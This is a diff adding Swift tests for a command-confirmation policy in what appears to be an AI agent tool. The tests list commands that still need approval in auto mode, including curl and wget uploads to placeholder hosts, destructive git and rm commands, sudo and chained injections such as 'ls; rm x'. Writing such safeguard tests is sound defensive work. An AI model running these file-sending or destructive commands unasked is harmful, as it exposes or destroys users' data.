@@ -35,4 +35,22 @@ import Testing
         for command in ["ls /", "ls ~", "ls ..", "ls ../x", "ls escape", "ls -la /etc", "cat a.txt", "head a.txt", "ls; rm x", "ls && pwd", "ls | wc", "ls > out", "ls $(pwd)", "ls `pwd`", "ls *", "ls \"a b\"", "ls\nrm x",
                         "date -s 2000", "whoami x", "env", "echo hi", "rm a", "ls -", "", "ls --color=always"] { #expect(!harmless(command), "確認に回す：\(command)") }
     }
+
+    // MARK: 自動モードでも、確認するコマンド
+
+    @Test func autoModeStillAsksForDeletingSendingOutAndTouchingTheSystem() {
+        let asks = ["rm a.txt", "rm -f a.txt", "rmdir d", "mv a b", "find . -name x -delete", "find . -exec rm {} ;", "git push origin main", "git clean -fd", "git reset --hard", "git checkout -- a",
+                    "curl -X POST https://x.example -d @a.txt", "curl -F file=@a https://x", "curl --data-binary @a https://x", "wget --post-file=a https://x", "scp a host:", "ssh host ls", "rsync -a . host:/x",
+                    "kill 1", "pkill foo", "osascript -e 'x'", "open a.app", "launchctl list", "defaults write a b c", "chmod +x a", "sudo ls", "npm install left-pad", "pip install x", "brew install x",
+                    "echo hi > /etc/x", "echo hi > ~/x", "echo hi > ../x", "bash run.sh", "sh -c 'rm a'", "cd d && rm a", "echo ok; rm a", "FOO=1 rm a", "env rm a", "eval foo"]
+        for command in asks { #expect(ACPCommandPolicy.needsConfirmationEvenInAuto(command), "確認のはず：\(command)") }
+    }
+
+    @Test func autoModeLetsOrdinaryWorkInsideTheFolderThrough() {
+        let free = ["ls -la", "cat a.md", "grep -rn foo .", "python3 build.py", "python3 -c 'print(1)'", "node app.js", "set -C; printf hi > check.txt", "echo hi > out.txt", "echo hi >> out.txt", "cp a b", "mkdir -p d", "touch a",
+                    "wc -l a.md | sort", "git status", "git log --oneline", "git diff", "curl https://example.com/page.html", "curl -s https://example.com -o page.html", "echo done > /dev/null", "ls 2>&1 | head", "head -5 a.md",
+                    "bash -c 'echo hi'", "sed -n 1,5p a.md", "diff a b", "date"]
+        for command in free { #expect(!ACPCommandPolicy.needsConfirmationEvenInAuto(command), "確認なしのはず：\(command)") }
+    }
 }
+
